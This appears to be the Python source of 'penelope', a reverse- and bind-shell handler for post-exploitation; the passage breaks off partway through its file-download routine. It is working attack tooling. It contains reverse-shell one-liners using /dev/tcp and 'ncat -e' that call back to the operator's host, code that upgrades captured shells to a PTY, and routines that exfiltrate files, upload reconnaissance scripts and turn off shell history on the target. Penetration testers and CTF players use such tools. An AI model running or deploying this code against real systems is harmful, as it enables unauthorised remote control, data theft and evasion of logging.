#!/usr/bin/env python3

# Copyright © 2021 @brightio <brightiocode@gmail.com>

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

__program__= "penelope"
__version__ = "0.8"

import os
import io
import re
import sys
import tty
import cmd
import code
import uuid
import time
import errno
import shlex
import select
import socket
import signal
import base64
import string
import random
import termios
import tarfile
import logging
import readline
import textwrap
import argparse
import platform
import threading
import subprocess

from pathlib import Path
from itertools import islice
from datetime import datetime
from collections import deque
from urllib.request import urlopen

class MainMenu(cmd.Cmd):

	def __init__(self):
		super().__init__()
		self.sid=None
		self.commands=[
			"use [sessionID|none]",
			"sessions [sessionID]",
			"interact [sessionID]",
			"kill [sessionID|all]",
			"download <glob>...",
			"open <glob>...",
			"upload <glob|URL>...",
			"recon [sessionID]",
			"spawn [sessionID]",
			"upgrade [sessionID]",
			"dir|. [sessionID]",
			"listeners [<add|stop> <Interface|IP> <Port>]",
			"connect <Host> <Port>",
			"hints",
			"reset",
			"history",
			"help [command]",
			"DEBUG",
			"SET [<param> <value>]",
			"exit|quit|q|Ctrl+D"
		]

	@property
	def raw_commands(self):
		return [re.split(' |\|',command)[0] for command in self.commands]

	@staticmethod
	def sessions(text, *extra):
		options=list(map(str,core.sessions))
		options.extend(extra)
		return [option for option in options if option.startswith(text)]

	@staticmethod
	def options(text):
		_options=(option for option in dir(options) if not option.startswith('_'))
		return [option for option in _options if option.startswith(text)]

	@staticmethod
	def load_history(histfile):
		readline.clear_history()
		if histfile.exists():
			readline.read_history_file(histfile)

	@staticmethod
	def write_history(histfile):
		readline.set_history_length(options.histlength)

		try:
			readline.write_history_file(histfile)
		except FileNotFoundError:
			cmdlogger.debug(f"History file '{histfile}' does not exist")

	def show(self):
		threading.Thread(target=self.cmdloop, name='Menu').start()
		core.threads.append("Menu")

	def set_id(self, ID):
		self.sid=ID
		session_part=f"{paint('Session','green')} {paint('['+str(self.sid),'red')}{paint(']','red')} "\
				if self.sid else ''
		self.prompt=f"{paint(f'┍┽ {__program__} ┾┑','magenta')} {session_part}> "

	def select(self, ID, extra=[]):
		if ID:
			if ID.isnumeric() and int(ID) in core.sessions:
				return int(ID)
			elif ID in extra:
				return ID
			else:
				cmdlogger.warning("Invalid session ID")
				return False
		else:
			if self.sid:
				return self.sid
			else:
				cmdlogger.warning("No session selected")
				return None

	def preloop(self):
		self.load_history(options.cmd_histfile)

	def postloop(self):
		self.write_history(options.cmd_histfile)

	def emptyline(self):
		self.lastcmd=None

	def do_help(self, line):
		"""Show menu help or help about specific command"""
		if line:
			for command in self.commands:
				if re.split(' |\|',command)[0]==line:
					commands=[command]
					break
			else:
				cmdlogger.warning("No such command")
		else:
			commands=self.commands

		for command in self.commands:
			print('\n'+paint(command,'green'))
			command=re.split(' |\|',command)[0]
			help_text=getattr(self, f"do_{command}").__doc__
			lines=textwrap.wrap(textwrap.dedent(help_text))
			print(textwrap.indent("\n".join(lines), '  '))
		print()

	def do_use(self, ID):
		"""Select a session"""
		if ID:=self.select(ID,extra=['none']):
			if ID=='none':
				self.set_id(None)
			else:
				self.set_id(ID)

	def do_sessions(self, line):
		"""Show active sessions. When followed by <sessionID>, interact with that session"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for session in core.sessions.values():
					print(session,flush=True)
				print(flush=True)
			else:
				cmdlogger.warning("No sessions yet 😟")

	def do_interact(self, ID):
		"""Interact with a session"""
		if ID:=self.select(ID):
			core.sessions[ID].attach()
			return True

	def do_kill(self, ID):
		"Kill a session"
		if ID:=self.select(ID,['all']):

			if ID=='all':
				session_count=len(core.sessions)
				if not session_count:
					cmdlogger.warning("No sessions to kill")
					return False
				try:
					if session_count > 1:
						readline.set_auto_history(False)
						answer=input(f"\r{paint(f'[?] Kill all ({session_count}) sessions? (y/N): ','yellow')}")
						readline.set_auto_history(True)
					else:
						answer='y'
				except EOFError:
					return self.do_kill(line)
				else:
					if answer.lower()=='y':
						for session in core.sessions.copy().values():
							session.kill()
					return
			else:
				core.sessions[ID].kill()

				if options.single_session and not core.sessions:
					core.stop()
					return True

	def do_download(self, remote_path):
		"""Download files and folders from the target"""
		if self.sid:
			if remote_path:
				core.sessions[self.sid].download(remote_path)
			else:
				cmdlogger.warning("No files or directories specified")
		else:
			cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")

	def do_open(self, remote_path):
		"""Download files and folders from the target and open them locally"""
		if self.sid:
			if remote_path:
				items=[]
				for item_path in remote_path.split():
					items.extend(core.sessions[self.sid].download(item_path))

				if len(items) > options.max_open_files:
					cmdlogger.warning(f"More than {options.max_open_files} items selected"
							f" for opening. The open list is truncated to "
							f"{options.max_open_files}.")
					items=items[:options.max_open_files]

				for item in items:
					Open(item)
			else:
				cmdlogger.warning("No files or directories specified")
		else:
			cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")

	def do_upload(self, local_globs):
		"""\
		Upload files and folders to the target. If URL is specified then it is downloaded
		locally and then uploaded to the target
		"""
		if self.sid:
			if local_globs:
				for glob in shlex.split(local_globs):
					core.sessions[self.sid].upload(glob)
			else:
				cmdlogger.warning("No files or directories specified")
		else:
			cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")

	def do_recon(self, ID):
		"""Upload preset reconnaissance scripts to the target"""
		if ID:=self.select(ID):
			for script in options.recon_scripts[core.sessions[ID].OS]:
				core.sessions[ID].upload(script)

	def do_spawn(self, ID):
		"""Spawn a new session. Whether it will be reverse or bind, depends on the current session."""
		if ID:=self.select(ID):
			#if core.sessions[ID].spawn():
			#	return True
			#threading.Thread(target=core.sessions[ID].spawn).start()
			core.sessions[ID].spawn()

	def do_upgrade(self, ID):
		"""\
		Upgrade the session's shell to "PTY". If it fails attempts to upgrade it to "Advanced".
		If this fail too, then falls back to "Basic" shell.
		"""
		if ID:=self.select(ID):
			core.sessions[ID].upgrade()

	def do_dir(self, ID):
		"""Open the session's local folder. If no session is selected, opens the base folder."""
		if self.sid:
			Open(core.sessions[self.sid].directory)
		else:
			Open(options.BASEDIR)

	def do_listeners(self, line):
		"""Add or stop a Listener. When invoked without parameters, it shows the active Listeners."""
		if line:
			try:
				subcommand,host,port=line.split(" ")
				port=int(port)
			except ValueError:
				try:
					subcommand,host=line.split(" ")
					if subcommand == "stop" and host == "all":
						if listeners:=core.listeners.copy():
							for listener in listeners:
								listener.stop()
						else:
							cmdlogger.warning("No listeners to stop...")
							return False
						return
				except ValueError:
					pass

				cmdlogger.error("Invalid HOST - PORT combination")
				cmdlogger.warning('listeners [<add|stop> <Interface|IP> <Port>]')
				return False

			if subcommand=="add":
				host=Interfaces().translate(host)
				Listener(host,port)
			elif subcommand=="stop":
				for listener in core.listeners:
					if (listener.host,listener.port)==(host,port):
						listener.stop()
						break
				else:
					cmdlogger.warning("No such listener...")
			else:
				cmdlogger.error("Invalid subcommand")
				self.onecmd("help listeners")
				return False
		else:
			if core.listeners:
				for listener in core.listeners:
					print(listener)
			else:
				cmdlogger.warning("No registered listeners...")

	def do_connect(self, line):
		"""Connect to a bind shell"""
		try:
			address,port=line.split(' ')
		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")
		else:
			if Connect(address,port) and not options.no_attach:
				return True

	def do_hints(self, line):
		"""Show sample commands to run on the targets to get reverse shell, based on the registered listeners"""
		print()
		for listener in core.listeners:
			print(listener.hints,end='\n\n')

	def do_reset(self, line):
		"""Reset the local terminal"""
		os.system("reset")

	def do_history(self, line):
		"""Show menu history"""
		self.write_history(options.cmd_histfile)
		if options.cmd_histfile.exists():
			print(open(options.cmd_histfile).read())

	def do_exit(self, line):
		"""Exit penelope"""
		try:
			readline.set_auto_history(False)
			answer=input(f"\r{paint('[?] Are you sure you want to exit? (y/N): ','yellow')}")
			readline.set_auto_history(True)
		except EOFError:
			#print('\r')
			return self.do_exit(line)
		else:
			if answer.lower()=='y':
				core.stop()
				return True
			return False

	def do_EOF(self, line):
		return self.do_exit(line)

	def do_DEBUG(self, line):
		"""Open debug console"""
		self.write_history(options.cmd_histfile)
		self.load_history(options.debug_histfile)
		code.interact(banner=paint("===> Entering debugging console...",'CYAN'), local=globals(),
			exitmsg=paint("<=== Leaving debugging console...",'CYAN'))
		self.write_history(options.debug_histfile)
		self.load_history(options.cmd_histfile)

		#for thread in threading.enumerate():
		#	print(thread)

	def do_SET(self, line):
		"""Set option values. When invoked without parameters it shows current option values"""
		if not line:
			for k,v in options.__dict__.items():
				spaces = 20 - len(k) # I know I can do it better
				print(f"{paint(k,'cyan')}{' '*spaces}{paint(v,'yellow')}")
		else:
			try:
				key,value=line.split(" ")
				cmd=f'options.{key}={value}'
				exec(cmd)
			except (ValueError,NameError,SyntaxError):
				cmdlogger.error("Invalid OPTION - VALUE pair")
				self.onecmd("help set")
				return False
			else:
				cmdlogger.info(f"{key} set to {value}")

	def default(self, line):
		if line in ['q','quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		else:
			parts=line.split()
			candidates=[command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(f"Invalid command '{line}'. "
						f"Please issue 'help' for all available commands")
			elif len(candidates) == 1:
				cmd=f"{candidates[0]} {' '.join(parts[1:])}"
				print(f"\x1b[1A{self.prompt}{cmd}")
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		subcommands=["add","stop"]
		if begidx == 10:
			return [command for command in subcommands if command.startswith(text)]
		if begidx == 14:
			return [iface_ip for iface_ip in Interfaces().list_all+['any','0.0.0.0'] if iface_ip.startswith(text)]
		if begidx == 15:
			listeners=[re.search(r'\((.*)\)',str(listener))[1].replace(':',' ') for listener in core.listeners]
			if len(listeners) > 1:
				listeners.append('all')
			return [listener for listener in listeners if listener.startswith(text)]
		if begidx > 15:
			...#print(line,text)

	def complete_use(self, text, line, begidx, endidx):
		return self.sessions(text,"none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.sessions(text,"all")

	def complete_upgrade(self, text, line, begidx, endidx):
		return self.sessions(text)

	def complete_spawn(self, text, line, begidx, endidx):
		return self.sessions(text)


class ControlPipe:

	def __init__(self):
		self._out,self._in=os.pipe()
		self.empty=True

	def fileno(self):
		return self._out

	def __lshift__(self, command):
		if self.empty:
			os.write(self._in,command)
			self.empty=False
		else:
			os.write(self._in,b'|')
			os.write(self._in,command)

	def read(self):
		self.empty=True
		return os.read(self._out,10240).split(b'|')


class Core:

	def __init__(self):
		self.control=ControlPipe()
		self.checkables={self.control}
		self.listeners=set()
		self.sessions=dict()
		self.attached_session=None
		self.ID=0
		self.started=False
		self.threads=[]

	def __getattr__(self, name):
		if name=='newID':
			self.ID+=1
			return self.ID

	def start(self):
		if not self.started:
			self.started=True
			threading.Thread(target=self._start, name="Core").start()
			self.threads.append("Core")

			if options.no_attach and not options.plain:
				menu.show()
	def _start(self):
		while True:
			try:
				readables,_,_=select.select(self.checkables,[],[])
			except ValueError:
				pass

			for readable in readables:

				# The control pipe
				if readable is self.control:
					for command in self.control.read():
						logger.debug(f"Control pipe: {command}")
						if command==b'stop':
							self.terminate()
							return
						elif command==b'+stdin':
							self.checkables.add(sys.stdin)
						elif command==b'-stdin':
							self.checkables.discard(sys.stdin)

				# The listeners
				elif readable.__class__ is Listener:
					logger.debug("New connection came")
					socket,endpoint=readable.socket.accept()
					threading.Thread(target=Session,args=(socket,*endpoint,readable)).start()
					#session=Session(socket,*endpoint,readable)

				# STDIN
				elif readable is sys.stdin:
					assert self.attached_session

					data = os.read(sys.stdin.fileno(),409600)

					if self.attached_session.type == 'PTY':
						self.attached_session.update_pty_size()

					if self.attached_session.is_cmd:
						self._cmd=data

					if data==options.ESCAPE:
						self.attached_session.detach()
					else:
						if self.attached_session.type == 'Basic': # need to see
							self.attached_session.record(data,
								_input=not self.attached_session.interactive)
						try:
							self.attached_session.socket.sendall(data)
						except (ConnectionResetError, BrokenPipeError):
							self.attached_session.exit()

				# The sessions
				else:
					try:
						with readable.lock:
							data=readable.socket.recv(409600)

							if not data:
								raise BrokenPipeError

							if readable.is_cmd and self._cmd==data:
								data,self._cmd=b'',b''

							if readable.is_attached:
								os.write(sys.stdout.fileno(),data)

							readable.record(data)

					except BlockingIOError:
						# The exec loop stole the packets as should thanks to the lock
						pass

					except (ConnectionResetError, BrokenPipeError):
						readable.exit()

					except OSError as e:
						if e.errno==errno.EBADF:
							# The menu thread killed the session
							pass

	def stop(self):
		self.control << b'stop'

	def terminate(self):
		self.started=False

		if sessions:=self.sessions.copy().values():
			logger.warning(f"Killing sessions...")
			for session in sessions:
				session.exit()

		if listeners:=self.listeners.copy():
			for listener in listeners:
				listener.stop()

		logger.info("Exited!")


def Connect(host, port):
	try:
		port=int(port)
		_socket=socket.socket()
		_socket.settimeout(5)
		_socket.connect((host,port))
		_socket.settimeout(None)

	except ConnectionRefusedError:
		logger.error(f"Connection refused... ({host}:{port})")

	except OSError:
		logger.error(f"Cannot reach {host}")

	except OverflowError:
		logger.error(f"Invalid port number. Valid numbers: 1-65535")

	except ValueError as e:
		logger.error(f"Port number must be numeric")
	else:
		core.start()
		logger.info(f"Connected to {paint(host,'blue')}:{paint(port,'red')} 🎯")
		session=Session(_socket,host,port)
		if session:
			return True

	if not options.no_attach and not options.plain:
		if core.ID==0:
			core.stop()
	return False


class Listener:

	def __init__(self, host=None, port=None):
		self.host=options.address if host is None else host
		self.host=Interfaces().translate(self.host)
		port=options.PORT if port is None else port
		self.socket=socket.socket()
		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.socket.setblocking(False)

		try:
			self.port=int(port)
			self.socket.bind((self.host,self.port))

		except PermissionError:
			logger.error(f"Cannot bind to port {self.port}: Insufficient privileges")
		except socket.gaierror:
			logger.error(f"Cannot resolve hostname")
		except OSError as e:
			if e.errno==errno.EADDRINUSE:
				logger.error(f"The port {self.port} is currently in use")
			elif e.errno==errno.EADDRNOTAVAIL:
				logger.error(f"Cannot listen on the requested address")
		except OverflowError:
			logger.error(f"Invalid port number. Valid numbers: 1-65535")
		except ValueError as e:
			logger.error(f"Port number must be numeric")
		else:
			logger.info(f"Listening for reverse shells on {paint(self.host,'blue')}"
				f" 🚪{paint(self.port,'red')} ")
			self.socket.listen(5)
			core.start()
			core.listeners.add(self)
			core.checkables.add(self)
			core.control << b"break"

			if options.hints:
				print(self.hints)

			return

		self.socket=None
		if core.ID==0 and not options.no_attach and not options.plain:
			core.stop()

	def __str__(self):
		return f"Listener({self.host}:{self.port})"

	def fileno(self):
		return self.socket.fileno()

	def stop(self):

		reason = "Single session mode: " if options.single_session else ''

		logger.warning(f"{reason}Stopping {self}")

		try:
			core.listeners.discard(self)
			core.checkables.discard(self)
			core.control << b"break"

		except (ValueError,OSError):
			logger.debug("Listener is already destroyed")

		self.socket.close()

	@property
	def hints(self):
		presets=[
			'bash -c "/bin/bash >& /dev/tcp/{}/{} 0>&1 &"',
			'ncat -e /bin/sh {} {}'
		]
		output=[paint(f"[{self} Hints] ===========---",'yellow')]

		if self.host=='0.0.0.0':
			for ip in Interfaces().list.values():
				output.extend([preset.format(paint(ip,'cyan','DIM'),self.port) for preset in presets])
				output.append('')
		else:
			output.extend([preset.format(self.host,self.port) for preset in presets])

		output[-1]=paint("[/Hints] ==========---",'yellow')
		return '\n'.join(output)

class LineBuffer:
	def __init__(self):
		self.len=100
		self.buffer=deque(maxlen=self.len)

	def __lshift__(self, data):
		if data:
			self.buffer.extendleft(data.splitlines(keepends=True))

	def __bytes__(self):
		lines=os.get_terminal_size().lines
		return b''.join(list(islice(self.buffer,0,lines-1))[::-1])


class Session:

	def __init__(self, _socket, target, port, listener=None):
		print("\a",flush=True,end='')

		self.socket=_socket
		self.socket.setblocking(False)
		self.target,self.port=target,port
		self.ip=_socket.getpeername()[0]

		if target == self.ip:
			try:
				self.hostname=socket.gethostbyaddr(target)[0]
			except socket.herror:
				self.hostname=None
				logger.debug(f"Cannot resolve hostname")
		else:
			self.hostname=target

		self.name=f"{self.hostname}~{self.ip}" if self.hostname else self.ip
		self.listener=listener
		self.latency=options.LATENCY

		self.OS=None
		self.type=None
		self.interactive=None
		self.echoing=None

		self.upgrade_attempted=False
		self.dimensions=None
		self.prompt=None
		self.new=True
		self.version=None

		self.last_lines=LineBuffer()
		self.lock=threading.Lock()
		self.control=ControlPipe()

		self.directory=options.BASEDIR/self.name

		if not options.no_log:
			self.directory.mkdir(parents=True,exist_ok=True)
			self.logpath=self.directory/f"{self.name}.log"
			newlog=not self.logpath.exists()
			self.logfile=open(self.logpath,'ab',buffering=0)
			if not options.no_timestamps and newlog:
				self.logfile.write(datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ",'magenta')).encode())

		self.determine()

		if self:
			if not core.started:
				return

			self.id=core.newID
			core.sessions[self.id]=self
			core.checkables.add(self)

			logger.info(f"Got {self.source} shell from {OSes[self.OS]} {paint(self.name,'white','RED')}{paint('','green',reset=False)} 💀 - Assigned SessionID {paint('<'+str(self.id)+'>','yellow')}")

			if options.single_session and self.listener:
				self.listener.stop()

			if not options.no_attach:
				if (not core.attached_session and not "Menu" in core.threads and self.listener)\
				or (not self.listener and not menu.lastcmd.startswith('spawn')):
					self.attach()
		else:
			logger.error(f"Invalid shell from {paint(self.name,'RED','white')}{paint('','red',reset=False)} 🙄\r")
			self.kill()

	def __bool__(self):
		return bool(self.socket.fileno()!=-1 and self.OS)

	def __str__(self):
		if menu.sid==self.id:
			ID=paint('['+str(self.id)+']','red')

		elif self.new:
			ID=paint('<'+str(self.id)+'>','yellow','BLINK')

		else:
			ID=paint('('+str(self.id)+')','yellow')

		source='Reverse shell from '+str(self.listener) if self.listener \
			else f'Bind shell (port {self.port})'

		return (f"\n{paint('SessionID ','blue')}{ID}\n"
			f"{paint('    └──── ','blue')}"
			f"{paint('Host: ','green')}{paint(self.name,'RED')}\n"
			f"\t  {paint('Shell Type: ','green')}"
			f"{paint(self.type,'CYAN') if not self.type == 'Basic' else self.type}\n"
			f"\t  {paint('OS Family: ','green')}{self.OS}\n"
			f"\t  {paint('Source: ','green')}{source}"
		)

	def fileno(self):
		return self.socket.fileno()

	@property
	def is_attached(self):
		return core.attached_session is self

	@property
	def source(self):
		return 'reverse' if self.listener else 'bind'

	@property
	def is_cmd(self):
		return (self.OS == 'Windows'
			and self.type == 'Basic'
			and self.echoing)

	def record(self, data, _input=False):
		self.last_lines << data

		if not options.no_log:
			self.log(data,_input)

	def log(self, data, _input=False):
		#data=re.sub(rb'(\x1b\x63|\x1b\x5b\x3f\x31\x30\x34\x39\x68|\x1b\x5b\x3f\x31\x30\x34\x39\x6c)',b'',data)
		data=re.sub(rb'\x1b\x63',b'',data) # Need to include all Clear escape codes

		if not options.no_timestamps:
			timestamp=datetime.now().strftime(paint("%Y-%m-%d %H:%M:%S: ",'magenta'))
			data=re.sub(rb'(\r\n|\r|\n|\v|\f)',rf'\1{timestamp}'.encode(),data)

		try:
			if _input:
				self.logfile.write(bytes(paint('ISSUED ==>','GREEN')+' ',encoding='utf8'))

			self.logfile.write(data)
		except ValueError:
			logger.debug("The session killed abnormally")

	def determine(self):
		history=' export HISTFILE=/dev/null;' if options.no_history else ''
		cmd=f' export HISTCONTROL=ignoreboth;{history} echo $((1*1000+3*100+3*10+7))`tty`\n'
		outcome=b'1337'

		response=self.exec(cmd, expect=(cmd.encode(),outcome,b"Windows PowerShell"))

		if r:=re.match(rf"(Microsoft Windows \[Version (.*)\].*){re.escape(cmd)}".encode(),
				response,re.DOTALL): #cmd
			self.OS='Windows'
			self.type='Basic'
			self.interactive=True
			self.echoing=True

			self.prompt=r[1]
			self.version=r[2]

		elif re.match(rf"{outcome.decode()}.*\r\nPS .:\\".encode(),
				response,re.DOTALL): # powershell socket
			self.OS='Windows'
			self.type='Basic'
			self.interactive=True
			self.echoing=False

			self.prompt=response.splitlines()[-1]

		elif b"Windows PowerShell" in response: # powershell with tty
			self.OS='Windows'
			self.type='PTY'
			self.interactive=True
			self.echoing=True

			self.prompt=response

		elif response.startswith(outcome): # sh / bash
			self.OS='Unix'
			self.type='Basic'
			self.interactive=False
			self.echoing=False

			self.prompt=b''

		elif r:=re.match(rf"(.*){outcome.decode()}".encode(),
					response,re.DOTALL): # sh -i / bash -i
			self.OS='Unix'
			self.interactive=True

			if r2:=re.match(rf"(.*){re.escape(cmd)}".encode(),r[1],re.DOTALL):

				self.echoing=True
				self.prompt=r2[1]
			else:

				self.echoing=False
				self.prompt=r[1]

			if b'not a tty' in response:

				self.type='Basic'
				if self.echoing:
					self.type='Advanced'

			elif b'/dev/pts/' in response:
				self.type='PTY'

		logger.debug(f"OS: {self.OS}")
		logger.debug(f"Type: {self.type}")
		logger.debug(f"Interactive: {self.interactive}")
		logger.debug(f"Echoing: {self.echoing}")

	def exec(self, cmd=None, raw=True, timeout=None, expect=[], clear=True):
		try:
			self.lock.acquire()
			if not self.control.empty:
				self.control.read()
			start=None
			output=b''

			if cmd is not None:
				cmd=cmd.encode()

				if not raw:
					token=str(uuid.uuid4())
					if self.OS=='Unix':
						cmd=(	f" export DELIMITER={token}; echo $DELIMITER$({cmd.decode()})"
							f"$DELIMITER\n".encode()
						)

					elif self.OS=='Windows': # TEMPORARY
						cmd=cmd
				else:
					if self.OS=='Unix':
						cmd=b' '+cmd+b'\n'

				if self.echoing:
					echoable=bytearray(cmd)

				if not self.type == 'Basic' and clear:
					if self.OS == 'Unix':
						precmd=b'\x1a\x05\x15' # Ctrl-Z + Ctrl-E + Ctrl-U
						logger.debug(f"\n\n\n{paint('Command sent','YELLOW')}: {precmd}")
						self.socket.sendall(precmd)

					elif self.OS == 'Windows':
						...#cmd=b'\x03'+cmd # Ctrl-C
				try:

					logger.debug(f"\n\n\n{paint('Command sent','YELLOW')}: {cmd}")

					self.socket.sendall(cmd)

					start=time.perf_counter()

				except OSError as e:
					if e.errno==errno.EBADF:
						self.lock.release()
						return None

				if not self.type == 'Basic' and clear:
					if self.OS == 'Unix':
						...
						#postcmd=b'\x19' # Ctrl-Y
						#logger.debug(f"\n\n\n{paint('Command sent','YELLOW')}: {postcmd}")
						#self.socket.sendall(postcmd)

					elif self.OS == 'Windows':
						...#cmd=b'\x03'+cmd # Ctrl-C

			if timeout is None:
				timeout=options.SHORT_TIMEOUT

			initial_timeout=timeout

			with io.BytesIO() as control_buffer:
				while True:
					logger.debug(paint("Waiting for data...",'blue'))
					readables,_,_=select.select([self.socket,self.control],[],[],timeout)
					stop=time.perf_counter()
					if start:
						logger.debug(f"Latency: {start-stop}")
					start=time.perf_counter()

					if self.control in readables:
						for command in self.control.read():
							logger.debug(f"Control pipe ID {self.id}: {command}")
							if command==b'stop':
								break

					if self.socket in readables:
						data=self.socket.recv(409600)

						if not data:
							raise BrokenPipeError

						logger.debug(f"{paint('Received','GREEN')} -> {data}")

						if cmd and self.echoing and echoable:
							for byte in data:
								#print(f"examine {byte}")
								if not echoable:
									control_buffer.write(bytes([byte]))
									#print(f"wrote {bytes([byte])}")
									if not timeout==self.latency:
										logger.debug("Echoable is exchausted!")
										timeout=self.latency
										logger.debug(f"{paint('Switched to Latency (2)','yellow')}")

								if echoable and byte==echoable[0]:
									#print(f"deleting: {chr(echoable[0])}")
									echoable.pop(0)

							continue

						control_buffer.write(data)
						if not timeout==self.latency:
							timeout=self.latency
							logger.debug(f"{paint('Switched to Latency (1)','yellow')}")
					else:
						if timeout != self.latency:
							output=control_buffer.getvalue()
							logger.debug(paint("TIMEOUT",'RED','white'))
							break
						else:
							logger.debug(paint("Latency expired",'RED','white'))
							if not raw:
								if result:=re.search(rf"{token}(.*){token}[\r\n]{{1,2}}{'.' if self.interactive else ''}".encode(),control_buffer.getvalue()):
									#print(control_buffer.getvalue())
									logger.debug(paint('Got all data!','green'))
									output=result[1]
									break
								else:
									logger.debug(paint('Did not get all data. Receive again...','yellow'))
									timeout=initial_timeout
							else:
								if expect:
									for token in expect:
										if token in control_buffer.getvalue():
											logger.debug(paint(f"Token {token} found in data",'yellow'))
											break
									else:
										logger.debug(paint('No token found in data. Receive again...','yellow'))
										timeout=initial_timeout
										continue

								#if self.interactive and not control_buffer.getvalue(): #NEED FIX
								#	timeout=initial_timeout
								#	continue

								logger.debug(paint('Maybe got all data.','yellow'))
								output=control_buffer.getvalue()
								break

			logger.debug(f"{paint('FINAL RESPONSE: ','BLUE','white')}{output}")

			self.lock.release()

			return output

		except (ConnectionResetError, BrokenPipeError, ValueError,OSError):
			logger.debug(paint("Connection terminated abnormally",'RED','white'))
			self.lock.release()
			self.exit()
			return b''

	def upgrade(self):

		self.upgrade_attempted=True
		logger.info("Attempting to upgrade shell to PTY...")

		if self.OS == "Unix":
			token=str(uuid.uuid4())

			cmd=(f'export TERM=xterm-256color PTY="import pty; pty.spawn(\'/bin/bash\')";'
			f'{{ python3 -c "$PTY" || python -c "$PTY"; }} 2>/dev/null ; if [ $? -eq 127 ];'
			f'then echo {token}; else exit 0; fi')

			if options.no_python:
				cmd=cmd.replace('python',rand())

			if not (response:=self.exec(cmd,clear=False)):
				logger.error("The shell became unresponsive. Killing it...")
				self.kill()
				self.detach(killed=True)
				return False

			if token in response.decode():
				if self.interactive and re.search(rf'{token}[\r\n]{{1,2}}$',response.decode()):
					self.exec()

				logger.error("Cannot obtain PTY shell - python does not exist on target. Attempting to obtain Advanced shell...")
				if self.type == 'Advanced':
					logger.debug("This is already bash -i")
					logger.info("The shell upgraded to Advanced")
					#self.record(self.prompt)
					return True

				cmd=f"bash -i 2>&1 ; if [ $? -eq 127 ]; then echo {token}; else exit 0; fi"

				if options.no_bash:
					cmd=cmd.replace('bash',rand())

				response=self.exec(cmd)

				if not token in response.decode() and not response.startswith(b'sh: '):
					logger.info("The shell upgraded to Advanced")
					self.type='Advanced'
					self.interactive=True
					self.echoing=True
					self.prompt=response
				else:
					if self.interactive and not re.search(rf'{token}[\r\n]{{1,2}}.',response.decode()):
						self.exec()

					logger.error("bash does not exist on target. Falling back to basic shell support")

					self.prompt=self.exec("sh -i;exit 0")
					self.type='Basic'
					self.interactive=True

			else:
				logger.info(f"Shell upgraded successfully! 💪")

				self.type='PTY'
				self.interactive=True
				self.echoing=True

				self.prompt=response

				self.update_pty_size()

		elif self.OS == "Windows":
			self.type='Basic'
			logger.warning("Upgrading Windows shell is not implemented yet.")

		return True

	def update_pty_size(self):
		#return False
		current_dimensions = os.get_terminal_size()
		if self.dimensions != current_dimensions:
			self.dimensions = current_dimensions
			if self.OS == 'Unix':
				cmd=f"stty rows {self.dimensions.lines} columns {self.dimensions.columns}"
				self.exec(cmd,raw=False)
			elif self.OS == 'Windows':
				#return False
				cmd=(
					f"$width={self.dimensions.columns};$height={self.dimensions.lines};"
					f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size "
					f"($width, $height);$Host.UI.RawUI.WindowSize = New-Object -TypeName "
					f"System.Management.Automation.Host.Size -ArgumentList ($width, $height)\r"
				)
				self.exec(cmd)

	def attach(self):

		if not options.no_upgrade and not self.upgrade_attempted:
			if not self.type == 'PTY' and not self.upgrade():
				return False

		if not self:
			return False

		if self.new:
			self.new=False
			if self.prompt:
				self.record(self.prompt)

		logger.info(
				f"Interacting with session {paint('['+str(self.id)+']','red')}"
				f"{paint(', Shell Type:','green')} {paint(self.type,'CYAN')}"
				f"{paint(', Menu key:','green')} {paint('F12' if self.type == 'PTY' else 'Ctrl+C','MAGENTA')}"
			)
		if not options.no_log:
			logger.info(f"{paint('Logging to ','green')}{paint(self.logpath,'yellow','DIM')} 📜")

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
		elif self.type == 'Advanced':
			tty.setcbreak(sys.stdin)

		os.write(sys.stdout.fileno(),bytes(self.last_lines))

		core.attached_session=self
		core.control << b'+stdin'

	def detach(self, killed=False):

		if not self.type == 'Basic':
			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

		if self.id in core.sessions:
			menu.set_id(self.id)
		else:
			menu.set_id(None)

		if killed:
			if options.single_session and not core.sessions:
				core.attached_session=None
				core.stop()
				return
		else:
			if options.extra_silent:
				print('\r',flush=True)
			logger.warning("Session detached...")

		if core.started:
			menu.show()

		core.attached_session=None
		core.control << b'-stdin'

	def download(self, remote_item_path):
		if self.OS == 'Unix':
			try:
				remote_globs=[glob for glob in shlex.split(remote_item_path)]
				local_download_folder=self.directory/"downloads"
				local_download_folder.mkdir(parents=True,exist_ok=True)

				cmd=f"tar cz {remote_item_path} 2>/dev/null|base64 -w0"
				data=self.exec(cmd,raw=False,timeout=options.LONG_TIMEOUT)
				#print(data)
				if not data:
					logger.error("Corrupted response")
					return []

				tar=tarfile.open(fileobj=io.BytesIO(base64.b64decode(data)))

				if not (items:=tar.getnames()):
					logger.warning("The item does not exist or access is denied")
					return []

				top_level_items={ re.match(f'[^{os.path.sep}]*',item)[0] for item in items }

				for item in top_level_items:
					local_item_path=local_download_folder/item
					if local_item_path.exists():
						new_path=local_item_path
						while new_path.exists():
							new_path=Path(str(new_path)+"_")
						local_item_path.rename(new_path)
						logger.debug(f"{local_item_path} exists. Renamed to {new_path}")

